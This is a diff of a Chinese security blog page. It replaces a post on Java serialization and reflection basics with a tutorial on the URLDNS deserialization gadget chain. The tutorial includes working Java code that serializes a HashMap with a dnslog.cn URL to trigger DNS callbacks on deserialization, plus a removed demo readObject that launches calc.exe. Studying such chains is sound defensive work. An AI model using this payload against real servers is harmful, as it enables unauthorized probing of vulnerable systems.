@@ -4,13 +4,9 @@
 
 <head>
     <meta charset="utf-8">
-    <meta name="keywords" content="Java反序列化基础&amp;反射基础, MajorT&#39;s Blog">
-    <meta name="description" content="乘风破浪会有时，直挂云帆济沧海
-什么是序列化和反序列化？
-为了java对象在网络介质中传输，将其转化为字节流，并从字节流转化为对象的过程。
-
-下面举个栗子感受一下：1.首先需要创建一个被操作的类的对象编写一个people类：
-1234567">
+    <meta name="keywords" content="urldns链利用, MajorT&#39;s Blog">
+    <meta name="description" content="天生我材必有用，千金散尽还复来
+三个部分反序列化调用主要分为三个部分，入口类，调用链，危险函数。入口类：含readObject()函数；调用链：入口类的readObject()函数中调用了其他类的函数，一层层调用下去，最终到达危险函数；危险">
     <meta http-equiv="X-UA-Compatible" content="IE=edge">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
     <meta name="renderer" content="webkit|ie-stand|ie-comp">
@@ -22,7 +18,7 @@
     <!-- Global site tag (gtag.js) - Google Analytics -->
 
 
-    <title>Java反序列化基础&amp;反射基础 | MajorT&#39;s Blog</title>
+    <title>urldns链利用 | MajorT&#39;s Blog</title>
     <link rel="icon" type="image/png" href="/favicon.png">
     
 
@@ -337,12 +333,12 @@
 
 
 
-<div class="bg-cover pd-header post-cover" style="background-image: url('/medias/featureimages/14.jpg')">
+<div class="bg-cover pd-header post-cover" style="background-image: url('/medias/featureimages/3.jpg')">
     <div class="container" style="right: 0px;left: 0px;">
         <div class="row">
             <div class="col s12 m12 l12">
                 <div class="brand">
-                    <h1 class="description center-align post-title">Java反序列化基础&amp;反射基础</h1>
+                    <h1 class="description center-align post-title">urldns链利用</h1>
                 </div>
             </div>
         </div>
@@ -395,21 +391,21 @@
                 
                 <div class="post-date info-break-policy">
                     <i class="far fa-calendar-minus fa-fw"></i>发布日期:&nbsp;&nbsp;
-                    2024-03-20
+                    2024-03-22
                 </div>
                 
 
                 
                 <div class="post-date info-break-policy">
                     <i class="far fa-calendar-check fa-fw"></i>更新日期:&nbsp;&nbsp;
-                    2024-03-20
+                    2024-03-22
                 </div>
                 
 
                 
                 <div class="info-break-policy">
                     <i class="far fa-file-word fa-fw"></i>文章字数:&nbsp;&nbsp;
-                    1.2k
+                    1.5k
                 </div>
                 
 
@@ -431,29 +427,24 @@
 
         <div class="card-content article-card-content">
             <div id="articleContent">
-                <p><em><strong>乘风破浪会有时，直挂云帆济沧海</strong></em></p>
-<h1><span id="什么是序列化和反序列化">什么是序列化和反序列化？</span></h1>
-为了java对象在网络介质中传输，将其转化为字节流，并从字节流转化为对象的过程。
-
-<p>下面举个栗子感受一下：<br>1.首先需要创建一个被操作的类的对象<br>编写一个people类：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">import java.io.Serializable;</span><br><span class="line">public class People implements Serializable &#123;</span><br><span class="line">	private String name;</span><br><span class="line">	private int age;</span><br><span class="line"></span><br><span class="line">	public People(String name, int age)&#123;</span><br><span class="line">		this.name = name;</span><br><span class="line">		this.age = age;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	public void setName(String name)&#123;</span><br><span class="line">		this.name = name;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	public void setAge(int age)&#123;</span><br><span class="line">		this.age = age;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	public String getName()&#123;</span><br><span class="line">		return name;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	public int getAge()&#123;</span><br><span class="line">		return age;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-<p>这是一个普通的people类，其中包含name和age属性，构造方法，get，set方法<br>不同的是，这个类实现了Serializable接口，只有实现了该接口的类才能够被序列化和反序列化。<br>2.序列化people类</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">import java.io.ObjectOutputStream;</span><br><span class="line">import java.io.FileOutputStream;</span><br><span class="line"></span><br><span class="line">	public class Serilizerable &#123;</span><br><span class="line">		public static void main(String[] args) throws Exception&#123;</span><br><span class="line">		People people = new People(&quot;Marry&quot;, 20);</span><br><span class="line">		ObjectOutputStream out = new ObjectOutputStream(new FileOutputStream(&quot;p1.ser&quot;));</span><br><span class="line">		out.writeObject(people);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<p>上述代码逻辑：<br>实例化people类；创建一个文件接受序列化数据；将people类序列化输出到p1.ser<br>执行完成后，在IDEA右边栏可以看到生成了一个p1.ser文件，即序列化成功</p>
-<p>3.反序列化p1.ser</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">import java.io.FileInputStream;</span><br><span class="line">import java.io.ObjectInputStream;</span><br><span class="line"></span><br><span class="line">public class unSerilizerable &#123;</span><br><span class="line">	public static void main(String[] args) throws Exception&#123;</span><br><span class="line">	ObjectInputStream in = new ObjectInputStream(new FileInputStream(&quot;p1.ser&quot;));</span><br><span class="line">	People p1 = (People)in.readObject();</span><br><span class="line">	System.out.println(p1);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-<p>上述代码逻辑：<br>读取p1.ser文件字节流并创建一个people对象接收，输出对象p1.<br>执行结果如下：<br><img src="/images/Image1.png" alt="img1"><br>也可以使用p1调用people的get方法：<br><img src="/images/Image2.png" alt="img2"></p>
-<p>4.在反序列化过程中为什么会导致安全问题？<br>由于序列化的数据是用户可控的，导致可能会出现安全问题。<br>这里举一个例子（people类重写了readObject函数，该函数本身存在危险函数）<br>上述情况基本不会在实际情况中出现，此处仅举例使用。</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">private void readObject(java.io.ObjectInputStream a) throws Exception&#123;</span><br><span class="line">	java.lang.Runtime.getRuntime().exec(&quot;calc.exe&quot;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-<p>在people类中添加上述方法后，反序列化执行一下：<br><img src="/images/Image3.png" alt="img3"><br>成功弹窗！<br>除了上述people类直接调用readObject方法，并且方法中存在危险函数的情况，还可能有一下三种可能。<br>    1.入口类中调用包含了可控类，这个类中有危险方法，readObject时调用；<br>    2.入口类中包含可控类，可控类中调用了其他类的危险方法，readObject时调用；<br>    3.构造函数或者静态代码加载时隐式执行。<br>以上总结参考白日梦组长视频，也是我java安全的开始，感谢组长。<br>接下来学习利用URLDNS链的前置知识——反射。</p>
-<h1><span id="什么是反射">什么是反射？</span></h1><p>反射就像一面镜子，映照出类的属性和方法等，可以在运行时动态的修改它们的值以及调用类的方法。</p>
-<p>我们还是用people类的例子来看。<br>people.java代码：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line">import java.io.IOException;</span><br><span class="line">import java.io.Serializable;</span><br><span class="line"></span><br><span class="line">public class People implements Serializable &#123;</span><br><span class="line">	private String name;</span><br><span class="line">	private int age;</span><br><span class="line"></span><br><span class="line">	public People(String name, int age)&#123;</span><br><span class="line">		this.name = name;</span><br><span class="line">		this.age = age;</span><br><span class="line">	&#125;</span><br><span class="line">	public People()&#123;</span><br><span class="line"></span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	public void setName(String name)&#123;</span><br><span class="line">		this.name = name;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	public void setAge(int age)&#123;</span><br><span class="line">		this.age = age;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	public String getName()&#123;</span><br><span class="line">		return name;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	public int getAge()&#123;</span><br><span class="line">		return age;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	@Override</span><br><span class="line">	public String toString() &#123;</span><br><span class="line">		return &quot;People&#123;&quot; +</span><br><span class="line">		&quot;name=&#x27;&quot; + name + &#x27;\&#x27;&#x27; +</span><br><span class="line">		&quot;, age=&quot; + age +</span><br><span class="line">		&#x27;&#125;&#x27;;</span><br><span class="line">	&#125;</span><br><span class="line">	public void action(String name)&#123;</span><br><span class="line">		System.out.println(&quot;I bit &quot;+name+&quot;&#x27;s ass&quot;);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-<p>反射的基础是Class类，它用于封装到被装入JVM中的类的信息，当一个类被装入到JVM中时会产生一个与之关联的java.lang.Class对象，通过这个Class对象对被装入的类的详细信息进行访问。<br>Reflection.java代码：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">Constructor ppconstructor = clazz.getConstructor(String.class, int.class); //传入有参构造方法的类型的calss类的对象</span><br><span class="line">People p2 = (People) ppconstructor.newInstance(&quot;Marry&quot;, 11); //传值</span><br><span class="line">System.out.println(p2);</span><br><span class="line"></span><br><span class="line">//获取类的属性</span><br><span class="line">Field ppfield = clazz.getDeclaredField(&quot;name&quot;); //获取name属性，getDeclaredField表示获取（私有）属性，getDeclaredFields表示所有属性</span><br><span class="line">ppfield.setAccessible(true); //获取私有属性时设置</span><br><span class="line">ppfield.set(p2, &quot;Joe&quot;); //赋值</span><br><span class="line">System.out.println(p2);</span><br><span class="line"></span><br><span class="line">//获取类的方法</span><br><span class="line">Method method = clazz.getDeclaredMethod(&quot;action&quot;, String.class); //根据方法名获取类的方法，String.class表示方法参数类型</span><br><span class="line">method.invoke(p2, &quot;eat&quot;); //赋值</span><br><span class="line">Method[] methods = clazz.getDeclaredMethods(); //获取类的所有方法</span><br><span class="line">for(Method m: methods)&#123;</span><br><span class="line">System.out.println(m);</span><br></pre></td></tr></table></figure>
-
-<p>输出：<br><img src="/images/Image4.png" alt="img4"><br>可以看到，这里已经为类的属性成功赋值，并获取了类中的方法。</p>
+                <p><em><strong>天生我材必有用，千金散尽还复来</strong></em></p>
+<h1><span id="三个部分">三个部分</span></h1><p>反序列化调用主要分为三个部分，入口类，调用链，危险函数。<br>入口类：含readObject()函数；<br>调用链：入口类的readObject()函数中调用了其他类的函数，一层层调用下去，最终到达危险函数；<br>危险函数：可以被攻击者利用执行命令或探测的函数。</p>
+<h1><span id="调用链">调用链</span></h1><p>urldns链触发原因为同名函数调用。<br>Gadget为：HashMap(put)-&gt;HashMap(putVal)-&gt;HashMap(hash)-&gt;URL(hashCode)</p>
+<h1><span id="代码分析">代码分析</span></h1><p>根据前一章的知识，首先来写一个序列化的类和一个反序列化的类（复习）。<br>序列化类代码：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">import java.io.FileOutputStream;</span><br><span class="line">import java.io.IOException;</span><br><span class="line">import java.io.ObjectOutputStream;</span><br><span class="line">public class Serializable &#123;</span><br><span class="line">	public static void ser(Object obj) throws IOException &#123;</span><br><span class="line">		ObjectOutputStream out = new ObjectOutputStream(new FileOutputStream(&quot;url.ser&quot;));</span><br><span class="line">		out.writeObject(obj);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>反序列化代码：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">import java.io.FileInputStream;</span><br><span class="line">import java.io.FileNotFoundException;</span><br><span class="line">import java.io.IOException;</span><br><span class="line">import java.io.ObjectInputStream;</span><br><span class="line">public class unSerializable &#123;</span><br><span class="line">	public static void main(String[] args) throws IOException, ClassNotFoundException &#123;</span><br><span class="line">		ObjectInputStream in = new ObjectInputStream(new FileInputStream(&quot;url.ser&quot;));</span><br><span class="line">		Object obj = (Object) in.readObject();</span><br><span class="line">		System.out.println(obj);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>接下来写利用代码，在编写代码前，我们先来介绍一下HashMap类。<br>HashMap是一种为了提升操作效率的数据结构，本质在使用上还是存取key-value键值对的使用方式，但是在实现上引入了key值的HASH映射到一维数组的形式来实现，再进入了链表来解决hash碰撞问题。<br>从键值对的设置和读取两方面来解释：<br>设置键值对key-value：<br>1）计算key的hash，即Hash(k)；<br>2）通过Hash(k)映射到有限的数组a的位置i；<br>3）在a[i]的位置存入value；<br>4）因为把计算出来的不同的key的hash映射到有限的数组长度，肯定会出现不同的key对应同一个数组位置i的情况。如果发现a[i]已经有了其他key的value，就放入这个i位置后面对应的链表（根据多少的情况可能变为树）中。</p>
+<p>读取key的value：<br>1）计算key的hash，即Hash(k)；<br>2）通过Hash(k)映射到有限的数组a的位置i；<br>3）读取在a[i]的位置的value；<br>4）如果发现a[i]已经有了其他key的value，就遍历这个i位置后面对应的链表（根据情况多少可能变为树）去查找这个key再去取值。</p>
+<p>利用代码：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">import java.io.IOException;</span><br><span class="line">import java.net.MalformedURLException;</span><br><span class="line">import java.net.URL;</span><br><span class="line">import java.util.HashMap;</span><br><span class="line">public class urldnstest &#123;</span><br><span class="line">	public static void main(String[] args) throws IOException &#123;</span><br><span class="line">		HashMap&lt;URL, Integer&gt; hashMap = new HashMap&lt;URL, Integer&gt;();</span><br><span class="line">		URL url = new URL(&quot;http://uthvkq.dnslog.cn&quot;);</span><br><span class="line">		hashMap.put(url, 1);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>执行后收到dnslog请求：<br><img src="/images/2/Image1.png" alt="img1"><br>这里没有用到序列化和反序列化函数，我们先放在一边，debug跟进调试一下。<br>将断点打在put函数那一行：<br><img src="/images/2/Image2.png" alt="img2"><br>跟进去到了HashMap类的put函数中：<br><img src="/images/2/Image3.png" alt="img3"><br>继续跟进，到了hash函数中：<br><img src="/images/2/Image4.png" alt="img4"><br>继续，到了URL类：<br><img src="/images/2/Image5.png" alt="img5"><br>在URL类中，hashCode值为-1，所以没有进入if，而是执行下面的hashCode函数：<br><img src="/images/2/Image6.png" alt="img6"><br>在hashCode函数中，执行的是一些解析操作，在这个过程中，dnslog会接收到请求，从而完成了整个触发过程。<br>接下来，我们只需要调用序列化函数，将这个过程序列化，当服务器在反序列化的过程中，就会执行我们的利用代码，将请求发送至dnslog平台。<br>（如果看到此处你有一些疑问，请接着看下去）<br>调用序列化函数：<br><img src="/images/2/Image7.png" alt="img7"><br>执行后在左侧项目栏中可以看到生成了一个url.ser文件，同时，dnslog也接收到了请求。<br><img src="/images/2/Image8.png" alt="img8"><br>好了，刚才有些有基础的小伙伴可能会发出这样的疑问：反序列化漏洞，你在序列化的时候就给我触发了，那我反序列化的时候触发个毛啊？<br>好问题。</p>
+<p>接下来我们来分析，序列化的时候什么地方是它触发的关键转折，以及怎样让它不触发。<br>回顾刚才，我们可以看到，在URL类的hashCode函数中，如下写道：<br><img src="/images/2/Image9.png" alt="img9"><br>这里会判断hashCode的值是否为-1，刚才序列化时，该值为-1，所以继续走到了最终解析我们传入域名的hashCode函数中，所以，如果我们让它的值在序列化时不等于-1，而在反序列化时等于-1，是否就能达到我们想要的效果了呢？<br>但是，我们要怎么做才能改变它的值呢？<br>没错，反射。</p>
+<p>利用反射实现urldns链的有效利用：<br>代码如下：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">public class urldnstest &#123;</span><br><span class="line">	public static void main(String[] args) throws IOException, NoSuchMethodException, NoSuchFieldException, IllegalAccessException &#123;</span><br><span class="line">		HashMap&lt;URL, Integer&gt; hashMap = new HashMap&lt;URL, Integer&gt;();</span><br><span class="line">		URL url = new URL(&quot;http://j31px5.dnslog.cn&quot;);</span><br><span class="line">		Class c = url.getClass();</span><br><span class="line">		Field urlfield = c.getDeclaredField(&quot;hashCode&quot;); //获取属性（私有属性）</span><br><span class="line">		urlfield.setAccessible(true);</span><br><span class="line">		urlfield.set(url, 1); //设置参数的值为1</span><br><span class="line">		hashMap.put(url, 1);</span><br><span class="line">		Serializable.ser(hashMap);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>这次dnslog平台已不会接收到请求。<br>另外，在反序列化的时候让hashCode的值重新等于-1，只需要在调用序列化函数之前添加一行urlfield.set(url, -1)<br>再次执行重新生成url.ser后，执行反序列化函数代码，成功在平台接收到请求：<br><img src="/images/2/Image10.png" alt="img10"><br>至此，urldns链的利用已分析完成。这是一个比较简单的利用链，但是作为一个新手，也翻来覆去看了好几遍哈哈，好在收获不浅。<br>这个链虽然没有办法直接执行代码，但是这个链不需要其他的依赖，原生java就能调用成功，同时也是我们做渗透时点到为止利用的一个好途径。</p>
+<h1><span id="ysoserial工具利用">ysoserial工具利用</span></h1><p>使用攻击生成payload：<br><img src="/images/2/Image11.png" alt="img11"><br>将其复制到项目文件夹下：<br><img src="/images/2/Image12.png" alt="img12"><br>反序列化执行：<br><img src="/images/2/Image13.png" alt="img13"><br>成功接收到请求：<br>【假装有图】，手贱一不小心刷新了，栓q。</p>
+<h3><span id="参考链接">参考链接：</span></h3><p><a target="_blank" rel="noopener" href="https://cloud.tencent.com/developer/article/2277485">https://cloud.tencent.com/developer/article/2277485</a></p>
 
                 
             </div>
@@ -480,7 +471,7 @@
                     </i>
                 </span>
                 <span class="reprint-info">
-                    <a href="https://majorttt.github.io/2024/03/20/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%9F%BA%E7%A1%80-%E5%8F%8D%E5%B0%84%E5%9F%BA%E7%A1%80/">https://majorttt.github.io/2024/03/20/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%9F%BA%E7%A1%80-%E5%8F%8D%E5%B0%84%E5%9F%BA%E7%A1%80/</a>
+                    <a href="https://majorttt.github.io/2024/03/22/urldns%E9%93%BE%E5%88%A9%E7%94%A8/">https://majorttt.github.io/2024/03/22/urldns%E9%93%BE%E5%88%A9%E7%94%A8/</a>
                 </span>
             </div>
             <div class="reprint__notice">
@@ -569,9 +560,10 @@
 <article id="prenext-posts" class="prev-next articles">
     <div class="row article-row">
         
-        <div class="article col s12 m6" data-aos="fade-up">
+        <div class="article col s12 m6" data-aos="fade-up" data-aos="fade-up">
             <div class="article-badge left-badge text-color">
-                <i class="fas fa-chevron-left"></i>&nbsp;上一篇</div>
+                <i class="far fa-dot-circle"></i>&nbsp;本篇
+            </div>
             <div class="card">
                 <a href="/2024/03/22/urldns%E9%93%BE%E5%88%A9%E7%94%A8/">
                     <div class="card-image">
@@ -589,9 +581,9 @@
                         
                     </div>
                     <div class="publish-info">
-                        <span class="publish-date">
-                            <i class="far fa-clock fa-fw icon-date"></i>2024-03-22
-                        </span>
+                            <span class="publish-date">
+                                <i class="far fa-clock fa-fw icon-date"></i>2024-03-22
+                            </span>
                         <span class="publish-author">
                             
                             <i class="fas fa-bookmark fa-fw icon-category"></i>
@@ -604,6 +596,7 @@
                         </span>
                     </div>
                 </div>
+
                 
                 <div class="card-action article-tags">
                     
@@ -623,7 +616,7 @@
         
         <div class="article col s12 m6" data-aos="fade-up">
             <div class="article-badge right-badge text-color">
-                本篇&nbsp;<i class="far fa-dot-circle"></i>
+                下一篇&nbsp;<i class="fas fa-chevron-right"></i>
             </div>
             <div class="card">
                 <a href="/2024/03/20/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%9F%BA%E7%A1%80-%E5%8F%8D%E5%B0%84%E5%9F%BA%E7%A1%80/">
@@ -657,7 +650,6 @@
                         </span>
                     </div>
                 </div>
-
                 
                 <div class="card-action article-tags">
                     
